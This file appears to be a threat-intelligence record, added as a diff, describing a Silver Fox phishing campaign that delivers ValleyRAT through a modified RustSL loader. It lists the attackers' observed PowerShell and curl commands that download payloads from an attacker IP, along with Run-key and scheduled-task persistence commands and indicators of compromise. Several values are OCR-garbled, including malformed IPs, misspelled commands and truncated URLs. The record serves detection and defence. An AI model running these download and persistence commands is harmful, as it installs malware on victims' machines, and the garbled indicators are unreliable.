@@ -1,0 +1,193 @@
+title: Silver Fox Threat Group Phishing Campaign Using Modified RustSL Loader
+description: A remote server delivered an encrypted module embedded in a loader, which
+  decrypted and executed various components including Bao8e.dll, ffmpeg, python scripts,
+  and established persistence via registry keys.
+attribution: Silver Fox
+malware_families:
+- ValleyRAT
+- ABCDoor
+cves: []
+ttps:
+  processes:
+  - Click File.exe
+  - powershell.exe
+  - curl.exe
+  - cmd.exe
+  - pythonw.exe
+  - powershellexe
+  - nodesxe
+  - explorerexe
+  - rslexe
+  - omdexe
+  - pythonwexe
+  - gpuTestexe
+  command_lines:
+  - powershell.exe -Command "& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri 'hxxp://154.82.81[.]205/YD20251001143052.zip' -OutFile '$appdata\appclient\111.zip' -UseBasicParsing -TimeoutSec 600 } catch { exit 1 } }"
+  - curl.exe -L -o "%LOCALAPPDATA%\appclient\111.zip" "hxxp://154.82.81[.]205/YD20251001143052.zip" --silent --show-error --insecure --max-time 600
+  - cmd.exe /c "C:\Users\<user>\AppData\Local\appclient\update.bat"
+  - start "" /B "%DES_DIR%\python\pythonw.exe" -m appclient
+  - cmd.exe /c "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"AppClient\" /t REG_SZ /d "\"<path_to_pythonw.exe>\" -m appclient\" /f"
+  - cmd.exe /c "schtasks /create /sc minute /mo 1 /tn \"AppClient\" /tr \"<path_to_pythonw.exe> -m appclient\" /f"
+  - powershell -Command "Start-Sleep -Seconds 5; Start-Process -FilePath \"%TEMP%\\tmpXXXXXXXX\\update\\update.ps1\" -ArgumentList \"%LOCALAPPDATA%\\appclient\" -WindowStyle Hidden"
+  - powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File run_direct.ps1
+  - curl.exe -L -0 $nodezip $nodeUnltar -xf $nodeZip -C $nodeDir --strip-components=1
+  - $nodePath -run.deobfuscated.obf.js,e=$encryptedConfig,-k=Sencryptiey -WindowStyle Hidden -Wait
+  powershell:
+  - '{[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    $ProgressPreference = ''SilentlyContinue''; try { Invoke-WebRequest -Uri ''hxxp://154.82.81[.]205/YD20251001143052.zip''
+    -OutFile ''$appdata\appclient\111.zip'' -UseBasicParsing -TimeoutSec 600 } catch
+    { exit 1 } }'
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  - try {$encryptedConfig = EUSSATSCXLAZEGMQAKhFUWAXQURTUVXSQFY ...$encryptKey = 'jiqi_20250923'
+  - '$nodePath = Join-Path $env:USERPROFILE ''.node
+
+    ode.exe'''
+  - if (-not (Test-Path $nodePath)) {$nodeUrl = "http://154.82.81.205/YD20251801143052.2ip"
+  - $nodeZip = Join-Path $env:TEMP "node-v22.19.8-win-x64.zip"
+  - $nodeDir = Join-Path $env:USERPROFILE '.node'
+  - if (-not (Test-Path $nodeDir)) { New-Item -ItemType Directory -Path $nodeDir -Force
+    }
+  - curl.exe -L -0 $nodezip $nodeUnltar -xf $nodeZip -C $nodeDir --strip-components=1
+  - Remove-Ttem $nodeZip -Force
+  - Start-Process -FilePath $nodePath -ArgumentList "run.deobfuscated.obf.js","e=$encryptedConfig,"-k=Sencryptiey
+    -WindowStyle Hidden -Wait"
+  - catch { exit 1 }exit @
+  scripts:
+  - '@echo off set "script_dir=%~dp0" set SRC_DIR=%script_dir% set DES_DIR=C:\ProgramData\Tailscale
+    rmdir /s /q "%DES_DIR%" mkdir "%DES_DIR%" call :recursiveCopy "%SRC_DIR%" "%DES_DIR%"
+    start "" /B "%DES_DIR%\python\pythonw.exe" -m appclient exit /b :recursiveCopy
+    set "src=%~1" set "dest=%~2" if not exist "%dest%" mkdir "%dest%" for %%F in ("%src%\*")
+    do ( copy "%%F" "%dest%" >nul ) for /d %%D in ("%src%\*") do ( call :recursiveCopy
+    "%%D" "%dest%\%%~nxD" ) exit /b start "" /B "%DES_DIR%\python\pythonw.exe" -m
+    appclient'
+  registry_keys:
+  - HKCU:\Console\0
+  - HKCU:\Console\1
+  - HKCU:\Console\IpDate
+  - HKCU:\Software\IpDates_info
+  - HKCU:\Software\Microsoft\Windows\CurrentVersion\Run:AppClient
+  - HKCU:\Software\CarEmu:FirstInstallTime
+  - HKCU:\Software\CarEmu:InstallChannel
+  - HKUIS1-5-21-918903957-4277594153-949637555-2622\Environment
+  image_loads:
+  - appclient.core.pyd
+  network_connections:
+  - Click File.exe -> abc.haijing88[.]com:443
+  - Click File.exe -> hxxp://154.82.81[.]205/YD20251001143052.zip
+  - pythonw.exe -> abc.fetish-friends[.]com:443
+  - pythonw.exe -> vnc.kcii2[.]com:443
+  - powershellexe -> http://154.82.81.205/YD20251801143052.2ip:80
+  - rslexe -> http://www.geopluginnet/json.:80
+  - rslexe -> http://ipapi.cofjson/:80
+  - rslexe -> http://ipinfo.iofjson/:80
+  - rslexe -> http://ipwho.is/:80
+  - rslexe -> http://ip-apl.com/json/:80
+  - rslexe -> 192.229115.229:8083
+  file_activity:
+  - C:\Users\<user>\AppData\Local\appclient\update.bat
+  - C:\ProgramData\Tailscale\
+  - '%LOCALAPPDATA%\applogs\device.log'
+  - '%LOCALAPPDATA%\applogs\exception_logs.zip'
+  - '%TEMP%\tmpXXXXXXXX\update.zip'
+  - '%TEMP%\tmpXXXXXXXX\update\'
+  - '%USERPROFILE%\.node\node.exe'
+  - '%USERPROFILE%\AppData\Local\appclient\'
+  - C:\Users\user_f tash\AppData\Local\Temp\RarSFXO\run_direct.ps1
+  - C:\Users\user_f tash\AppData\Local\GpuTest exe
+  - C:\Users\user. tash\AppData\LoocaMiorosoftWindows\Logs\gspavn.exs
+  persistence:
+  - Phantom Persistence via RegisterApplicationRestart API
+  - Registry Run key (HKCU) pointing to <path_to_pythonw.exe> -m appclient
+  - Task scheduler task named AppClient running every minute
+  - Registry modified Event initiatorI0Atags File "C:\Users\user_f tash\AppData\Local\GpuTest
+    exe"
+  process_relations: []
+iocs:
+  hashes:
+  - e6362a81991323e198a463a8ce255533
+  - 2c5a1dd4cb53287fe0ed14e0b7b7b1b7
+  - 4a5195a38a458cdd2c1b5ab13af3b393
+  - e66bae6e8621db2a835fa6721c3e5bbe
+  - fc546acf1735127db05fb5bc354093e0
+  - 2375193669e243e830ef5794226352e7
+  - 5b998a5bc5ad1c550564294034d4a62c
+  - c50c980d3f4b7ed970f083b0d37a6a6a
+  - de8f0008b15f2404f721f76fac34456a
+  - a543b96b0938de798dd4f683dd92a94a
+  - fa08b243f12e31940b8b4b82d3498804
+  - 13669b8f2bd0af53a3fe9ac0490499e5
+  - 04194f8ddd0518fd8005f0e87ae96335
+  - f15a67899cfe4decff76d4cd1677c254
+  - 11705121f64fa36f1e9d7e59867b0724
+  - 4d343515f4c87b9a2ffd2f46665d2d57
+  - dfc64dd9d8f776ca5440c35fef5d406e
+  - eefc28e9f2c0c0592af186be8e3570d2
+  - 6cf382d3a0eae57b8baaa263e4ed8d00
+  - 32407207e9e9a0948d167dca96c41d1a
+  - d17caf6f5d6ba3393a3a865d1c43c3d2
+  - 6495c409b59deb72cfcb2b2da983b3bb
+  - b500e0a8c87dffe6f20c6e067b51afbf
+  - 814032eec3bc31643f8faa4234d0e049
+  - 90257aa1e7c9118055c09d4a978d4bee
+  - f8371097121549feb21e3bcc2eeea522
+  - 2b92e125184469a0c3740abcaa10350c
+  - 043e457726f1bbb6046cb0c9869dbd7d
+  - 0c3b60ffcdeadccce744bfa03b1a3556
+  - e6362a81991323e198a46328ce255533
+  - a3b699d394a5068ca739148837c4d2b4
+  ip_addresses:
+  - 154.82.81[.]205
+  - 207.56.138[.]28
+  - 127.0.0.1
+  - 45.118.133[.]203
+  - 108.187.37[.]85
+  - 108.187.42[.]63
+  - 1192.229.115[.]229
+  - 207.56.119[.]216
+  - 192.163.167[.]144
+  - 5.192.219[.]60
+  - 192.238.205[.]47
+  - 45.32.108[.]1
+  - 154.82.81.205
+  - 192.229115.229
+  - 34117.59.81
+  - '101010.76'
+  domains:
+  - abc.haijing88[.]com
+  - ip-api.com
+  - ipwho.is
+  - ipinfo.io
+  - ipapi.co
+  - www.geoplugin.net
+  - abc.fetish-friends[.]com
+  - abc.3mkorealtd[.]com
+  - abc.sudsmama[.]com
+  - abc.woopami[.]com
+  - abc.petitechanson[.]com
+  - abc.doublemobile[.]com
+  - smcagov[.]cc
+  - roldco[.]com
+  - sudsmama[.]com
+  - vnc.kcii2[.]com
+  urls:
+  - hxxp://abc.haijing88[.]com/uploads//.zip
+  - hxxp://154.82.81[.]205/YD20251001143052.zip
+  - hxxps://mcagov[.]cc/download.php?type=exe
+  - hxxps://abc.fetish-friends[.]com/uploads/appclient.zip
+  - hxxps://tinyurl[.]com/4nzkync8 -> hxxps://roldco[.]com/api/download/c51bbd17-ef08-4d6c-ab4c-d7bf49483dd6
+  - hxxps://tinyurl[.]com/bde63yuu -> hxxps://sudsmama[.]com/api/download/c8ea0a2c-42c2-4159-9337-ee774ed5e7cb
+  - hxxps://abc.fetish-friends[.]com/setup?channel=jiqi_0819
+  - hxxps://abc.fetish-friends[.]com/setup/install?channel=whatsapp_0826
+  - hxxps://abc.fetish-friends[.]com/setup/install?channel=dianhua-0903
+  - hxxps://tinyurl[.]com/322ccxbf -> hxxps://sudsmama.com/api/download/50e24b3a-8662-4d2f-9837-8cc62aa8f697
+  - hxxps://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.2ip
+  - hxxp://www.geopluginnet/json.
+  - hxxp://ipapi.cofjson/
+  - hxxp://ipinfo.iofjson/
+  - hxxp://ipwho.is/
+  - hxxp://ip-apl.com/json/
+authors: []
+reference: https://securelist.com/silver-fox-tax-notification-campaign/119575/
+date_of_publication: April 30, 2026
+file_creation_date: May 01, 2026
